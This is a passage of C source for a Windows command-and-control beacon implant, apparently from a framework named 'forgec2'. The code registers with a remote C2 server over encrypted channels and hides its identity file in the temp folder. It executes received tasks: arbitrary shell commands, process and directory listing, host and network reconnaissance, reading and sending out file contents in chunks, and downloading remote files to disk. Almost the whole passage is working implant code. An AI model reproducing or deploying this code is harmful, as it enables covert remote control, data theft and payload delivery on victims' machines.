    if (size > 4 * 1024 * 1024) size = 4 * 1024 * 1024;
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    if (offset > 0) {
        li.QuadPart = offset;
        if (!SetFilePointerEx(h, li, NULL, FILE_BEGIN)) {
            CloseHandle(h); return NULL;
        }
    }
    want = (DWORD)size;
    buf = (BYTE *)malloc(want + 1);
    if (!buf) { CloseHandle(h); return NULL; }
    ReadFile(h, buf, want, &rd, NULL);
    CloseHandle(h);
    *outlen = rd;
    if (roff) *roff = offset;
    return buf;
}

static const char *base_name(const char *p) {
    const char *b1 = strrchr(p, '\\');
    const char *b2 = strrchr(p, '/');
    const char *b = b1 > b2 ? b1 : b2;
    return b ? b + 1 : p;
}

/* File result with transfer fields (filename/path/offset/size/mac). */
static char *emit_file_result(unsigned long long id, const char *type,
                              const char *b64out, const char *rid,
                              const char *filename, const char *path,
                              long long offset, long long size,
                              const char *machex) {
    char *fesc = jescape(filename ? filename : "", strlen(filename ? filename : ""));
    char *pesc = jescape(path ? path : "", strlen(path ? path : ""));
    char *o;
    size_t need;
    if (!fesc || !pesc) { free(fesc); free(pesc); return NULL; }
    need = strlen(b64out) + strlen(type) + strlen(fesc) + strlen(pesc) + 256;
    o = (char *)malloc(need);
    if (o) {
        _snprintf(o, need,
            "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\","
            "\"encoding\":\"base64\",\"rid\":\"%s\",\"filename\":\"%s\","
            "\"path\":\"%s\",\"offset\":%lld,\"size\":%lld,\"mac\":\"%s\"}",
            id, type, b64out, rid ? rid : "", fesc, pesc,
            offset, size, machex ? machex : "");
    }
    free(fesc);
    free(pesc);
    return o;
}

/* Minimal HTTPS-capable file download over WinHTTP (C2-independent).
 * Cap 64MB. Returns 0 ok, -1 on failure with err filled. */
static int download_url_to_file(const char *url, const char *dest,
                                char *err, size_t errcap) {
    wchar_t wurl[4096];
    wchar_t whost[256], wpath[2048];
    URL_COMPONENTS uc;
    HINTERNET hs = NULL, hc = NULL, hr = NULL;
    HANDLE hf = INVALID_HANDLE_VALUE;
    DWORD total = 0;
    const DWORD CAP = 64 * 1024 * 1024;
    int rc = -1;
    if (!url || !url[0] || !dest || !dest[0]) {
        if (err) strcpy_s(err, errcap, "url and destination required");
        return -1;
    }
    if (!path_is_safe(dest)) {
        if (err) strcpy_s(err, errcap, "path traversal rejected");
        return -1;
    }
    if (MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, 4096) <= 0) {
        if (err) strcpy_s(err, errcap, "bad url");
        return -1;
    }
    memset(&uc, 0, sizeof(uc));
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = whost; uc.dwHostNameLength = 256;
    uc.lpszUrlPath = wpath; uc.dwUrlPathLength = 2048;
    if (!WinHttpCrackUrl(wurl, 0, 0, &uc)) {
        if (err) strcpy_s(err, errcap, "bad url");
        return -1;
    }
    if (uc.nScheme != INTERNET_SCHEME_HTTP && uc.nScheme != INTERNET_SCHEME_HTTPS) {
        if (err) strcpy_s(err, errcap, "only http(s) supported");
        return -1;
    }
    hs = WinHttpOpen(L"FC2-C/0.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hs) goto done;
    hc = WinHttpConnect(hs, whost, uc.nPort, 0);
    if (!hc) goto done;
    hr = WinHttpOpenRequest(hc, L"GET", wpath, NULL, WINHTTP_NO_REFERER,
                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                             uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hr) goto done;
    if (!WinHttpSendRequest(hr, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) goto done;
    if (!WinHttpReceiveResponse(hr, NULL)) goto done;
    hf = CreateFileA(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                      FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        if (err) strcpy_s(err, errcap, "cannot write destination");
        goto done;
    }
    for (;;) {
        DWORD avail = 0, got = 0;
        BYTE chunk[16384];
        if (!WinHttpQueryDataAvailable(hr, &avail)) goto done;
        if (avail == 0) break;
        while (avail > 0) {
            DWORD want = avail > sizeof(chunk) ? sizeof(chunk) : avail;
            DWORD wr = 0;
            if (total + want > CAP) {
                if (err) strcpy_s(err, errcap, "response exceeds 64MB cap");
                goto done;
            }
            if (!WinHttpReadData(hr, chunk, want, &got) || got == 0) goto done;
            if (!WriteFile(hf, chunk, got, &wr, NULL) || wr != got) {
                if (err) strcpy_s(err, errcap, "write failed");
                goto done;
            }
            total += got;
            avail -= got;
        }
    }
    rc = 0;
done:
    if (rc != 0 && err && err[0] == '\0')
        _snprintf(err, errcap, "download failed (%lu)", GetLastError());
    if (hf != INVALID_HANDLE_VALUE) CloseHandle(hf);
    if (rc != 0 && hf != INVALID_HANDLE_VALUE) DeleteFileA(dest);
    if (hr) WinHttpCloseHandle(hr);
    if (hc) WinHttpCloseHandle(hc);
    if (hs) WinHttpCloseHandle(hs);
    return rc;
}

/* Network section: adapters with MAC + IPv4 (native IP Helper, no shell). */
static int hostinfo_net(char *out, size_t cap) {
    DWORD len = 0;
    IP_ADAPTER_INFO *ad = NULL;
    size_t used = 0;
    int n = 0;
    if (GetAdaptersInfo(NULL, &len) != ERROR_BUFFER_OVERFLOW) return -1;
    ad = (IP_ADAPTER_INFO *)malloc(len);
    if (!ad) return -1;
    if (GetAdaptersInfo(ad, &len) != NO_ERROR) { free(ad); return -1; }
    used = (size_t)_snprintf(out, cap, "\"network\":{\"adapters\":[");
    {
        IP_ADAPTER_INFO *a = ad;
        while (a && used + 256 < cap) {
            char mac[32] = {0};
            unsigned i;
            for (i = 0; i < a->AddressLength && i < 8; i++)
                _snprintf(mac + i*3, sizeof(mac) - i*3, "%02X%s",
                           a->Address[i], (i+1 < a->AddressLength) ? "-" : "");
            {
                char *desc = jescape(a->Description, strlen(a->Description));
                used += (size_t)_snprintf(out + used, cap - used,
                    "%s{\"name\":\"%s\",\"mac\":\"%s\",\"ip\":\"%s\",\"gateway\":\"%s\"}",
                    n ? "," : "", desc ? desc : "", mac,
                    a->IpAddressList.IpAddress.String[0] ? a->IpAddressList.IpAddress.String : "",
                    a->GatewayList.IpAddress.String[0] ? a->GatewayList.IpAddress.String : "");
                free(desc);
                n++;
            }
            a = a->Next;
        }
    }
    free(ad);
    if (used + 4 >= cap) return -1;
    used += (size_t)_snprintf(out + used, cap - used, "]}");
    return 0;
}

static char *do_hostinfo(const char *category) {
    char host[256] = {0}, user[256] = {0};
    DWORD hlen = sizeof(host), ulen = sizeof(user);
    char *out = (char *)malloc(16384);
    OSVERSIONINFOEXA vi;
    MEMORYSTATUSEX ms;
    char cat[32] = {0};
    size_t used = 0;
    int want_sys = 0, want_net = 0, want_rt = 0;
    if (!out) return NULL;
    {
        const char *c = (category && category[0]) ? category : "all";
        size_t i;
        for (i = 0; i < sizeof(cat)-1 && c[i]; i++)
            cat[i] = (c[i] >= 'A' && c[i] <= 'Z') ? (char)(c[i] + 32) : c[i];
    }
    if (strcmp(cat, "all") == 0) want_sys = want_net = want_rt = 1;
    else if (strcmp(cat, "system") == 0) want_sys = 1;
    else if (strcmp(cat, "network") == 0) want_net = 1;
    else if (strcmp(cat, "runtime") == 0) want_rt = 1;
    else {
        _snprintf(out, 16384, "{\"error\":\"unknown category \"\"%s\"\" (want: all|system|network|runtime)\"}", cat);
        return out;
    }
    GetComputerNameA(host, &hlen);
    GetUserNameA(user, &ulen);
    memset(&vi, 0, sizeof(vi));
    vi.dwOSVersionInfoSize = sizeof(vi);
    GetVersionExA((OSVERSIONINFOA *)&vi);
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    used = (size_t)_snprintf(out, 16384,
        "{\"category\":\"%s\",\"platform\":\"windows\",\"sections\":{", cat);
    if (want_sys) {
        used += (size_t)_snprintf(out + used, 16384 - used,
            "\"system\":{\"hostname\":\"%s\",\"username\":\"%s\","
            "\"os\":\"Windows %lu.%lu build %lu\",\"arch\":\"amd64\",\"pid\":%lu,"
            "\"mem_total_mb\":%llu,\"mem_free_mb\":%llu}",
            host, user,
            (unsigned long)vi.dwMajorVersion, (unsigned long)vi.dwMinorVersion,
            (unsigned long)vi.dwBuildNumber, (unsigned long)GetCurrentProcessId(),
            ms.ullTotalPhys / (1024*1024), ms.ullAvailPhys / (1024*1024));
    }
    if (want_net) {
        char nb[8192];
        if (want_sys) { out[used++] = ','; out[used] = '\0'; }
        if (hostinfo_net(nb, sizeof(nb)) == 0) {
            size_t nl = strlen(nb);
            if (used + nl + 1 < 16384) { memcpy(out + used, nb, nl); used += nl; out[used] = '\0'; }
        } else if (used + 32 < 16384) {
            used += (size_t)_snprintf(out + used, 16384 - used,
                "\"network\":{\"error\":\"adapter query failed\"}");
        }
    }
    if (want_rt) {
        unsigned long long ms_up = GetTickCount64();
        unsigned dd = (unsigned)(ms_up / 86400000ULL);
        unsigned hh = (unsigned)((ms_up / 3600000ULL) % 24);
        unsigned mm = (unsigned)((ms_up / 60000ULL) % 60);
        if (want_sys || want_net) { out[used++] = ','; out[used] = '\0'; }
        if (used + 128 < 16384)
            used += (size_t)_snprintf(out + used, 16384 - used,
                "\"runtime\":{\"uptime\":\"%ud %uh %um\",\"pid\":%lu}",
                dd, hh, mm, (unsigned long)GetCurrentProcessId());
    }
    if (used + 4 >= 16384) { free(out); return NULL; }
    out[used++] = '}'; out[used++] = '}'; out[used] = '\0';
    return out;
}

static void do_sleep_interval(void) {
    int base_ms = g_interval * 1000;
    int jitter_ms = 0;
    if (g_jitter > 0 && g_jitter <= 100) {
        BYTE r[4];
        unsigned v = 0;
        if (cng_random(r, 4) == 0) {
            v = ((unsigned)r[0] << 24) | ((unsigned)r[1] << 16) |
                ((unsigned)r[2] << 8) | r[3];
            jitter_ms = (int)((long long)base_ms * (v % (unsigned)(g_jitter + 1)) / 100);
            if ((v >> 16) & 1) base_ms += jitter_ms;
            else { base_ms -= jitter_ms; if (base_ms < 1000) base_ms = 1000; }
        }
    }
    if (base_ms < 1000) base_ms = 1000;
    Sleep((DWORD)base_ms);
}

/* ---------- frames ---------- */

static char *build_register(void) {
    BYTE idpub[32];
    char *idb64, *hmacb64, *out;
    long long ts = (long long)_time64(NULL);
    unsigned long long seq = next_seq();
    char seqs[32], tss[32];
    /* identity keypair doubles as the session keypair seed: the server
     * derives the registration session from our identity public key. */
    extern BYTE g_idpub_for_reg[32];
    memcpy(idpub, g_idpub_for_reg, 32);
    idb64 = b64enc(idpub, 32);
    if (!idb64) return NULL;
    hmacb64 = make_reg_hmac(idb64, ts, seq);
    if (!hmacb64) { free(idb64); return NULL; }
    _snprintf(seqs, sizeof(seqs), "%llu", seq);
    _snprintf(tss, sizeof(tss), "%lld", ts);
    out = (char *)malloc(2048);
    if (out) {
        _snprintf(out, 2048,
                  "{\"uuid\":\"%s\",\"seq\":%s,\"ts\":%s,"
                  "\"ecdh_pub\":\"%s\",\"id_pub\":\"%s\","
                  "\"secret_id\":\"%s\",\"reg_hmac\":\"%s\"}",
                  g_uuid, seqs, tss, idb64, idb64, SECRET_ID, hmacb64);
    }
    free(idb64);
    free(hmacb64);
    return out;
}

/* 1 = register (fresh identity / server asked), 0 = handshake (recover). */
static int g_mode_register = 1;

/* frame mac = b64(HMAC(regKey, parts...)) */
static char *make_frame_mac(const char *a, const char *b, const char *c, const char *d) {
    BYTE mac[32];
    size_t la = strlen(a), lb = strlen(b), lc = strlen(c), ld = strlen(d);
    char *msg = (char *)malloc(la + lb + lc + ld + 1);
    char *out;
    if (!msg) return NULL;
    memcpy(msg, a, la);
    memcpy(msg + la, b, lb);
    memcpy(msg + la + lb, c, lc);
    memcpy(msg + la + lb + lc, d, ld);
    msg[la + lb + lc + ld] = '\0';
    if (cng_hmac_sha256(g_regkey, 32, (BYTE *)msg, (DWORD)(la + lb + lc + ld), mac) != 0) {
        free(msg);
        return NULL;
    }
    free(msg);
    out = b64enc(mac, 32);
    cng_wipe(mac, 32);
    return out;
}

static char *build_handshake(void) {
    BYTE eph[32];
    char *ephb64, *macb64, *out;
    long long ts = (long long)_time64(NULL);
    unsigned long long seq = next_seq();
    char seqs[32], tss[32];
    if (cng_x25519_ephemeral(eph) != 0) return NULL;
    ephb64 = b64enc(eph, 32);
    if (!ephb64) return NULL;
    _snprintf(seqs, sizeof(seqs), "%llu", seq);
    _snprintf(tss, sizeof(tss), "%lld", ts);
    macb64 = make_frame_mac(g_uuid, ephb64, tss, seqs);
    if (!macb64) { free(ephb64); return NULL; }
    out = (char *)malloc(2048);
    if (out) {
        _snprintf(out, 2048,
                  "{\"uuid\":\"%s\",\"seq\":%s,\"ts\":%s,"
                  "\"ecdh_pub\":\"%s\",\"secret_id\":\"%s\",\"mac\":\"%s\"}",
                  g_uuid, seqs, tss, ephb64, SECRET_ID, macb64);
    }
    free(ephb64);
    free(macb64);
    return out;
}

BYTE g_idpub_for_reg[32];

static char *build_encrypted(const char *inner, unsigned long long *seqout) {
    char aad[128];
    char seqs[32], tss[32];
    unsigned long long seq = next_seq();
    char *c64, *out;
    BYTE *blob;
    DWORD blobcap, bloblen;
    long long ts = (long long)_time64(NULL);
    _snprintf(seqs, sizeof(seqs), "%llu", seq);
    _snprintf(tss, sizeof(tss), "%lld", ts);
    _snprintf(aad, sizeof(aad), "%s%c%s", g_uuid, '\0', seqs);
    blobcap = (DWORD)strlen(inner) + 12 + 16;
    blob = (BYTE *)malloc(blobcap);
    if (!blob) return NULL;
    bloblen = (DWORD)cng_aesgcm_encrypt(g_sesskey, (const BYTE *)inner,
                                        (DWORD)strlen(inner),
                                        (const BYTE *)aad,
                                        (DWORD)(strlen(g_uuid) + 1 + strlen(seqs)),
                                        blob, blobcap);
    if ((int)bloblen < 0) { free(blob); return NULL; }
    c64 = b64enc(blob, bloblen);
    free(blob);
    if (!c64) return NULL;
    out = (char *)malloc(strlen(c64) + 256);
    if (out) {
        _snprintf(out, strlen(c64) + 256,
                  "{\"uuid\":\"%s\",\"seq\":%s,\"ts\":%s,\"c\":\"%s\"}",
                  g_uuid, seqs, tss, c64);
    }
    free(c64);
    *seqout = seq;
    return out;
}

static void gen_uuid(void) {
    BYTE b[16];
    cng_random(b, 16);
    b[6] = (BYTE)((b[6] & 0x0F) | 0x40);
    b[8] = (BYTE)((b[8] & 0x3F) | 0x80);
    _snprintf(g_uuid, sizeof(g_uuid),
              "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
              b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7],
              b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]);
}

/* Identity persistence: UUID + X25519 identity private key live in %TEMP%.
 * Without this every restart would burn a fresh v3 secret (each secret binds
 * to exactly one agent id) and orphan the previous agent row. */
static int ident_path(char *out, size_t cap) {
    DWORD n = GetTempPathA((DWORD)cap, out);
    if (n == 0 || n >= cap - 16) return -1;
    strcat_s(out, cap, "fc2c.dat");
    return 0;
}

static int ident_save(const BYTE idpriv[32]) {
    char path[MAX_PATH];
    HANDLE hf;
    DWORD wr;
    BYTE blob[16 + 37 + 32];
    if (ident_path(path, sizeof(path)) != 0) return -1;
    /* layout: uuid ascii (36+NUL=37) + priv(32); %TEMP% is user-private. */
    memcpy(blob, g_uuid, 37);
    memcpy(blob + 37, idpriv, 32);
    memset(blob + 37 + 32, 0, sizeof(blob) - 37 - 32);
    hf = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                     FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hf == INVALID_HANDLE_VALUE) return -1;
    WriteFile(hf, blob, sizeof(blob), &wr, NULL);
    CloseHandle(hf);
    cng_wipe(blob, sizeof(blob));
    return wr == sizeof(blob) ? 0 : -1;
}

static int ident_load(BYTE idpriv[32]) {
    char path[MAX_PATH];
    HANDLE hf;
    DWORD rd = 0;
    BYTE blob[16 + 37 + 32];
    int hexok = 1;
    size_t i;
    if (ident_path(path, sizeof(path)) != 0) return -1;
    hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return -1;
    ReadFile(hf, blob, sizeof(blob), &rd, NULL);
    CloseHandle(hf);
    if (rd != sizeof(blob) || blob[36] != '\0') return -1;
    /* validate uuid shape loosely (36 chars, dashes at 8/13/18/23) */
    if (strlen((char *)blob) != 36 || blob[8] != '-' || blob[13] != '-' ||
        blob[18] != '-' || blob[23] != '-') return -1;
    for (i = 0; i < 36; i++) {
        char c = (char)blob[i];
        if (i == 8 || i == 13 || i == 18 || i == 23) continue;
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
              (c >= 'A' && c <= 'F'))) { hexok = 0; break; }
    }
    if (!hexok) return -1;
    memcpy(g_uuid, blob, 37);
    memcpy(idpriv, blob + 37, 32);
    cng_wipe(blob, sizeof(blob));
    return 0;
}

int main(void) {
    fprintf(stderr, "[cbeacon] enter\n");
    BYTE shared[32], sesskey[32];
    DWORD seclen = 0;
    BYTE *secret = NULL;
    char *results = _strdup("");
    setvbuf(stdout, NULL, _IONBF, 0);
    if (SECRET_ID[0] == '\0' || SECRET_B64[0] == '\0') {
        fprintf(stderr, "[cbeacon] build with -DSECRET_ID=... -DSECRET_B64=...\n");
        return 1;
    }
    secret = b64dec(SECRET_B64, &seclen);
    if (!secret || seclen != 32) {
        fprintf(stderr, "[cbeacon] bad SECRET_B64\n");
        return 1;
    }
    fprintf(stderr, "[cbeacon] secret ok\n");
    memcpy(g_regkey, secret, 32);
    cng_wipe(secret, seclen);
    free(secret);
    {
        BYTE idpriv[32], idpub[32];
        fprintf(stderr, "[cbeacon] loading identity...\n");
        if (ident_load(idpriv) == 0 && cng_x25519_use_priv(idpriv, idpub) == 0) {
            printf("[cbeacon] identity restored\n");
            g_mode_register = 0;
            seq_load(); /* recover via handshake, not re-register */
        } else {
            fprintf(stderr, "[cbeacon] fresh identity...\n");
            gen_uuid();
            g_seq = 0;
            seq_save();
            if (cng_random(idpriv, 32) != 0) return 1;
            fprintf(stderr, "[cbeacon] random ok, selftest+derive...\n");
            if (cng_x25519_use_priv(idpriv, idpub) != 0) return 1;
            fprintf(stderr, "[cbeacon] key ok, saving...\n");
            if (ident_save(idpriv) != 0)
                fprintf(stderr, "[cbeacon] warning: identity not persisted\n");
        }
        memcpy(g_idpub_for_reg, idpub, 32);
        cng_wipe(idpriv, 32);
    }
    printf("[cbeacon] uuid=%s c2=%s:%d%s\n", g_uuid, C2_HOST, C2_PORT, BEACON_PATH);

    for (;;) {
        char *frame = NULL, *resp = NULL;
        DWORD resplen = 0;
        unsigned long long frameseq = 0;
        if (!g_registered) {
            frame = g_mode_register ? build_register() : build_handshake();
            dbglog(g_mode_register ? "built-reg" : "built-hs", "", 0);
        } else {
            /* results can carry base64 file chunks: build inner on the heap. */
            char *info = build_info_json();
            size_t rlen = results ? strlen(results) : 0;
            size_t icap = rlen + INFO_CAP + 512;
            char *inner = (char *)malloc(icap);
            if (!info || !inner) {
                if (info) free(info);
                if (inner) free(inner);
                Sleep(5000);
                continue;
            }
            _snprintf(inner, icap,
                      "{\"uuid\":\"%s\",\"pv\":2,\"info\":{%s},\"results\":[%s]}",
                      g_uuid, info, results);
            dbglog("results", results, (int)strlen(results));
            dbglog("inner", inner, (int)strlen(inner));
            free(info);
            free(results);
            results = _strdup("");
            frame = build_encrypted(inner, &frameseq);
            free(inner);
        }
        if (!frame) { Sleep(5000); continue; }
        resp = http_post(frame, (DWORD)strlen(frame), &resplen);
        free(frame);
        dbglog("post-ret", "", 0);
        if (!resp) { do_sleep_interval(); continue; }
        dbglog(g_registered ? "resp-enc" : "resp-reg", resp, (int)resplen);

        if (!g_registered) {
            /* auth response: {seq,reg_ok,ecdh_pub,mac,reregister?} */
            char spub[512] = {0}, mac[512] = {0};
            unsigned long long seq = ju64(resp, "seq");
            int regok = jbool(resp, "reg_ok");
            int rereg = jbool(resp, "reregister");
            if (strstr(resp, "kill_switch")) {
                fprintf(stderr, "[cbeacon] kill-switch armed, exiting\n");
                free(resp);
                return 0;
            }
            if (rereg) {
                /* Server lost our row but holds our secret: re-enroll. */
                g_mode_register = 1;
                free(resp);
                Sleep(2000);
                continue;
            }
            if (!jstring(resp, "ecdh_pub", spub, sizeof(spub)) ||
                !jstring(resp, "mac", mac, sizeof(mac)) ||
                !verify_resp_mac(seq, spub, mac)) {
                fprintf(stderr, "[cbeacon] auth response rejected\n");
                /* Flip auth mode: register-reject on a persisted identity
                 * means "already registered" -> handshake; handshake-reject
                 * means "unknown row" -> try a fresh register. */
                g_mode_register = g_mode_register ? 0 : 1;
                free(resp);
                Sleep(5000);
                continue;
            }
            {
                DWORD publen = 0;
                BYTE *sp = b64dec(spub, &publen);
                int agree_ok;
                if (!sp || publen != 32) {
                    fprintf(stderr, "[cbeacon] ECDH failed\n");
                    if (sp) free(sp);
                    free(resp);
                    return 1;
                }
                /* Registration sessions derive from the identity key, plain
                 * handshakes from the ephemeral one used in the frame. */
                if (regok)
                    agree_ok = cng_x25519_agree(sp, shared);
                else
                    agree_ok = cng_x25519_agree_eph(sp, shared);
                free(sp);
                if (agree_ok != 0) {
                    fprintf(stderr, "[cbeacon] ECDH failed\n");
                    free(resp);
                    return 1;
                }
            }
            if (cng_hkdf_sha256(shared, 32, (const BYTE *)"forgec2-session-v2", 18,
                                (const BYTE *)g_uuid, (DWORD)strlen(g_uuid), sesskey) != 0) {
                fprintf(stderr, "[cbeacon] session derive failed\n");
                free(resp);
                return 1;
            }
            cng_wipe(shared, 32);
            memcpy(g_sesskey, sesskey, 32);
            cng_wipe(sesskey, 32);
            g_have_session = 1;
            g_registered = 1;
            if (regok) {
                printf("[cbeacon] registered, session established\n");
            } else {
                printf("[cbeacon] handshake ok, session established\n");
            }
            free(resp);
            continue;
        }

        /* encrypted response: {"c": ...} or resync plain envelope.
         * NOTE: c64 is heap-allocated: a 2MB stack array overflows the
         * default 1MB main-thread stack at function entry (0xC00000FD). */
        {
            char *c64 = (char *)malloc(RESP_CAP);
            if (!c64) { free(resp); do_sleep_interval(); continue; }
            if (jstring(resp, "c", c64, RESP_CAP)) {
                BYTE *blob;
                DWORD bloblen = 0;
                char aad[128];
                char seqs[32];
                BYTE *pt;
                DWORD ptcap = RESP_CAP;
                int ptlen;
                _snprintf(seqs, sizeof(seqs), "%llu", frameseq);
                _snprintf(aad, sizeof(aad), "%s%c%s", g_uuid, '\0', seqs);
                blob = b64dec(c64, &bloblen);
                pt = (BYTE *)malloc(ptcap);
                if (blob && pt) {
                    ptlen = cng_aesgcm_decrypt(g_sesskey, blob, bloblen,
                                              (const BYTE *)aad,
                                              (DWORD)(strlen(g_uuid) + 1 + strlen(seqs)),
                                              pt, ptcap);
                    if (ptlen > 0) {
                        pt[ptlen] = '\0';
                        /* dispatch tasks; results queued for next beacon */
                        {
                            const char *tp = strstr((char *)pt, "\"tasks\"");
                            if (tp) {
                                const char *arr = strchr(tp, '[');
                                if (arr) {
                                    const char *p = arr + 1;
                                    char *newres = _strdup("");
                                    int kill_now = 0;
                                    while (*p && *p != ']') {
                                        p = jskip(p);
                                        if (*p == ',') { p++; continue; }
                                        if (*p != '{') break;
                                        {
                                            ctask_t t;
                                            const char *next = parse_task(p, &t);
                                            char *rid = make_rid();
                                            char *robj = NULL;
                                            if (!rid) rid = _strdup("");
                                            if (t.type[0] && decrypt_task(&t) != 0) {
                                                robj = emit_error_result(t.id, t.type[0] ? t.type : "shell",
                                                    "task payload decryption failed", rid);
                                            } else if (t.type[0] == '\0') {
                                                robj = NULL;
                                            } else if (strcmp(t.type, "shell") == 0) {
                                                DWORD olen = 0;
                                                char *out = exec_shell_full(t.command ? t.command : "", t.shell, &olen);
                                                if (out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, "shell", b64, rid) : NULL;
                                                    free(b64);
                                                    cng_wipe(out, olen);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "shell", "exec failed", rid);
                                            } else if (strcmp(t.type, "ps") == 0 || strcmp(t.type, "process_tree") == 0) {
                                                DWORD olen = 0;
                                                char *out = do_ps(&olen);
                                                if (out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, t.type, b64, rid) : NULL;
                                                    free(b64);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, t.type, "ps failed", rid);
                                            } else if (strcmp(t.type, "ls") == 0) {
                                                DWORD olen = 0;
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                char *out = do_ls(pp, &olen);
                                                if (out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, "ls", b64, rid) : NULL;
                                                    free(b64);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "ls", "ls failed", rid);
                                            } else if (strcmp(t.type, "read") == 0) {
                                                DWORD rlen = 0;
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                BYTE *data = do_read_file(pp, &rlen);
                                                if (data) {
                                                    char *b64 = b64enc(data, rlen);
                                                    robj = b64 ? emit_b64_result(t.id, "read", b64, rid) : NULL;
                                                    free(b64);
                                                    cng_wipe(data, rlen);
                                                    free(data);
                                                } else {
                                                    robj = emit_error_result(t.id, "read", "cannot open file", rid);
                                                }
                                            } else if (strcmp(t.type, "hostinfo") == 0) {
                                                char *out = do_hostinfo(t.command);
                                                robj = out ? emit_text_result(t.id, "hostinfo", out, rid) : NULL;
                                                if (out) free(out);
                                                if (!robj) robj = emit_error_result(t.id, "hostinfo", "collect failed", rid);
                                            } else if (strcmp(t.type, "set_sleep") == 0) {
                                                const char *c = t.command ? t.command : "";
                                                int iv = atoi(c);
                                                const char *comma = strchr(c, ',');
                                                int jt = comma ? atoi(comma + 1) : g_jitter;
                                                if (iv >= 1 && iv <= 86400) g_interval = iv;
                                                else robj = emit_error_result(t.id, "set_sleep", "sleep interval must be 1..86400", rid);
                                                if (!robj) {
                                                    if (jt >= 0 && jt <= 100) g_jitter = jt;
                                                    { char msg[128]; _snprintf(msg, sizeof(msg), "sleep set to %d s, jitter %d%%", g_interval, g_jitter); robj = emit_text_result(t.id, "set_sleep", msg, rid); }
                                                }
                                            } else if (strcmp(t.type, "beacon_now") == 0) {
                                                robj = emit_text_result(t.id, "beacon_now", "beacon forced", rid);
                                            } else if (strcmp(t.type, "kill") == 0) {
                                                robj = emit_text_result(t.id, "kill", "Agent terminating...", rid);
                                                kill_now = 1;
                                            } else if (strcmp(t.type, "download") == 0) {
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                if (pp && (_strnicmp(pp, "http://", 7) == 0 || _strnicmp(pp, "https://", 8) == 0)) {
                                                    robj = emit_error_result(t.id, "download", "use download_url for URLs", rid);
                                                } else if (!pp || !pp[0]) {
                                                    robj = emit_error_result(t.id, "download", "path required", rid);
                                                } else {
                                                    DWORD rlen = 0;
                                                    long long roff = 0;
                                                    BYTE *data = do_read_chunk(pp, t.offset, t.size, &rlen, &roff);
                                                    if (data) {
                                                        char *b64 = b64enc(data, rlen);
                                                        if (b64) {
                                                            char mh[65] = {0};
                                                            if (chain_download_link(t.id, data, rlen, mh) != 0) mh[0] = '\0';
                                                            robj = emit_file_result(t.id, "download", b64, rid,
                                                                base_name(pp), pp, roff, (long long)rlen, mh);
                                                            free(b64);
                                                        }
                                                        cng_wipe(data, rlen);
                                                        free(data);
                                                    } else {
                                                        robj = emit_error_result(t.id, "download", "cannot open file", rid);
                                                    }
                                                    if (!robj) robj = emit_error_result(t.id, "download", "chunk failed", rid);
                                                }
                                            } else if (strcmp(t.type, "download_url") == 0) {
                                                const char *url = t.command;
                                                const char *dst = (t.path && t.path[0]) ? t.path : t.shell;
                                                if (!url || !url[0]) {
                                                    robj = emit_error_result(t.id, "download_url", "URL required", rid);
                                                } else {
                                                    char destbuf[MAX_PATH];
                                                    char errmsg[256] = {0};
                                                    if (!dst || !dst[0]) {
                                                        const char *sl = strrchr(url, '/');
                                                        sl = sl ? sl + 1 : url;
                                                        if (!sl[0]) sl = "downloaded.bin";
                                                        _snprintf(destbuf, sizeof(destbuf), "%s", sl);
                                                        dst = destbuf;
                                                    }
                                                    if (download_url_to_file(url, dst, errmsg, sizeof(errmsg)) == 0) {
                                                        char msg[512];
                                                        _snprintf(msg, sizeof(msg), "Downloaded to %s", dst);
                                                        robj = emit_text_result(t.id, "download_url", msg, rid);
                                                    } else {
                                                        robj = emit_error_result(t.id, "download_url", errmsg[0] ? errmsg : "download failed", rid);
                                                    }
                                                }
                                            } else if (strcmp(t.type, "upload") == 0) {
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                const char *b64 = (t.data && t.data[0]) ? t.data : t.shell;
                                                if (!pp || !pp[0] || !b64 || !b64[0]) {
                                                    robj = emit_error_result(t.id, "upload", "upload: path and data required", rid);
                                                } else if (!path_is_safe(pp)) {
                                                    robj = emit_error_result(t.id, "upload", "path traversal rejected", rid);
                                                } else {
                                                    DWORD blen = 0;
                                                    BYTE *raw = b64dec(b64, &blen);
                                                    if (!raw) {
                                                        robj = emit_error_result(t.id, "upload", "upload: bad base64", rid);
